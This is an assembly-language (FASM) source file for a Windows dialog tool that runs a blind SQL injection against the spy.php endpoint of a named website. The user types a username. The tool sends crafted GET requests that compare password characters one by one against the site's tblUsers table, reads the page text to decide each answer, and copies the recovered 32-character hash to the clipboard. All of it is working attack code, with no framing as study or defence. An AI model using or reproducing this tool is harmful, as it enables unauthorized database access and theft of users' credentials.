format pe gui 4.0
include '%fasm_inc2%\win32ax.inc'
include 'regexp\ctypedef.inc'
include 'regexp\AsmRegEx.inc'

;Running Wild;2a9f1557dde79a1077552ed2b10c6b4b
green = 32CD32h
red   = 0FFh

IPPROTO_TCP = 0

IDD_MAIN = 1
ID_START = 1
ID_LOGIN = 2
ID_PASS  = 3

.data
data resource from 'res.res'
end data

include 'regexp\AsmRegEr.inc'
include 'regexp\ctypemap.inc'

regex	  REGEX_T
hModule   dd ?
qhttp	  db "GET /spy.php?spyid=42233+and+ascii(lower(substring((select+password+from+tblUsers+where+name='%s'),%u,1)))%c%u HTTP/1.1",13,10,\
	     'Host: o-o-d.com',13,10,13,10,0
abc	  db 'abcdef1234567890',0
string	  db 'No spyreport',0
stop	  db 0
hPass	  dd ?
hBrush	  dd ?
color	  dd ?
username  rb 30
result	  rb 35
char	  db 0
buffer	  rb 1348

.code
start:
	invoke GetModuleHandleA,0
	mov [hModule],eax
	invoke DialogBoxParamA,eax,IDD_MAIN,HWND_DESKTOP,main,0
	invoke ExitProcess,0

proc main hwnd,msg,wparam,lparam
	cmp [msg],WM_CLOSE
	je .wmclose
	cmp [msg],WM_COMMAND
	je .wmcommand
	cmp [msg],WM_LBUTTONDOWN
	je .wmlbuttondown
	cmp [msg],WM_INITDIALOG
	je .wminitdialog
	.if [msg]=WM_CTLCOLORSTATIC
		mov eax,[hPass]
		cmp eax,[lparam]
		jne @f
		invoke SetTextColor,[wparam],[color]
		@@:
		invoke SetBkMode,[wparam],TRANSPARENT
		mov eax,[hBrush]
		jmp .finish
	.endif
	xor eax,eax
	jmp .finish
     .wminitdialog:
	stdcall regcomp,regex,string;(REGEX_T *regex_t, char *pattern)
	invoke GetDlgItem,[hwnd],ID_PASS
	mov [hPass],eax
	invoke GetSysColor,COLOR_BTNFACE
	invoke CreateSolidBrush,eax
	mov [hBrush],eax
	jmp .processed
     .wmlbuttondown:
	invoke SendMessageA,[hwnd],WM_NCLBUTTONDOWN,2,0
	jmp .processed
     .wmcommand:
	.if [wparam]=BN_CLICKED shl 16 + ID_START
		.if [stop]=-1
			mov [stop],1
			jmp .processed
		.elseif [stop]=1
			jmp .processed
		.endif
		invoke RtlZeroMemory,result,35
		mov [stop],-1
		mov [char],0
		mov [color],green
		invoke SetDlgItemTextA,[hwnd],ID_PASS,0
		invoke CreateThread,0,0,sql1,[hwnd],0,0
		invoke CloseHandle,eax
	.endif
	jmp .processed
     .wmclose:
	invoke EndDialog,[hwnd],0
     .processed:
	mov eax,1
     .finish:
	ret
endp
proc sql1 hwnd
	invoke GetDlgItemTextA,[hwnd],ID_LOGIN,username,30
	test eax,eax
	je .exit
	invoke SetDlgItemTextA,[hwnd],ID_START,'STOP'
	invoke GetDlgItem,[hwnd],ID_LOGIN
	invoke EnableWindow,eax,0
	xor edi,edi
	inc edi
	mov ecx,32
	.m1:
	push ecx
	xor esi,esi
	cinvoke wsprintfA,buffer,qhttp,username,edi,3Eh,29h ; >
	stdcall send1
	.if eax=0
		add esp,4
		jmp .fin
	.endif
	;
	cinvoke wsprintfA,buffer,qhttp,username,edi,3Eh,60h ; >
	stdcall send1
	.if eax=0
		mov ecx,10
		mov esi,6
		jmp .m2
	.endif
	;
	mov ecx,17
	.m2:
	.if [stop]=1
		add esp,4
		jmp .fin2
	.endif
	push ecx
	movsx ebx,byte [abc+esi]
	.if ebx=0
		add esp,4*2
		jmp .fin
	.endif
	;
	movsx eax,[char]
	mov byte [result+eax],bl
	invoke SetDlgItemTextA,[hwnd],ID_PASS,result
	;
	cinvoke wsprintfA,buffer,qhttp,username,edi,3Dh,ebx ; =
	stdcall send1
	.if eax<>0
		invoke SetDlgItemTextA,[hwnd],ID_PASS,result
		movsx eax,[char]
		movsx ebx,byte [abc+esi]
		mov byte [result+eax],bl
		inc [char]
		add esp,4*1
		jmp .m3
	.endif
	inc esi
	pop ecx
	;loop .m2
	dec ecx
	test ecx,ecx
	jne .m2
	;
	.m3:
	inc edi
	pop ecx
	dec ecx
	test ecx,ecx
	jne .m1
     .fin:
	.if [char]<>32
		mov [color],red
		invoke SetDlgItemTextA,[hwnd],ID_PASS,'ERR'
	.else
		invoke GlobalAlloc,GPTR,33
		mov esi,eax
		invoke lstrcpyA,eax,result
		invoke OpenClipboard,0
		invoke SetClipboardData,CF_TEXT,esi
		invoke CloseClipboard
		invoke GlobalFree,esi
		invoke SetDlgItemTextA,[hwnd],ID_PASS,result
	.endif
      .exit:
	mov [stop],0
	invoke GetDlgItem,[hwnd],ID_LOGIN
	invoke EnableWindow,eax,1
	invoke SetDlgItemTextA,[hwnd],ID_START,'START'
	invoke ExitThread,0
     .fin2:
	mov [color],red
	invoke SetDlgItemTextA,[hwnd],ID_PASS,'STOPPED'
	jmp .exit
endp

proc send1
	local wsa:WSADATA
	local buff:DWORD
	local hSock:DWORD
	local sin:sockaddr_in

	push esi
	push edi
	lea eax,[wsa]
	invoke WSAStartup,0101h,eax
	invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
	mov [hSock],eax
	mov [sin.sin_family],AF_INET
	invoke gethostbyname,'o-o-d.com'
	mov eax,[eax+hostent.h_addr_list]
	mov eax,[eax]
	mov eax,[eax]
	mov [sin.sin_addr],eax
	invoke htons,80
	mov [sin.sin_port],ax
	lea eax,[sin]
	invoke connect,[hSock],eax,sizeof.sockaddr_in
	invoke lstrlenA,buffer
	invoke send,[hSock],buffer,eax,0
	invoke recv,[hSock],buffer,1348,0
	invoke closesocket,[hSock]
	invoke WSACleanup
	stdcall regexec,regex,buffer;(REGEX_T *regex_t, char *string)
	pop edi
	pop esi
	.if eax=REGEX_NOMATCH
		jmp .ok
	.endif
	xor eax,eax
	ret
     .ok:
	xor eax,eax
	inc eax
	ret
endp



.end start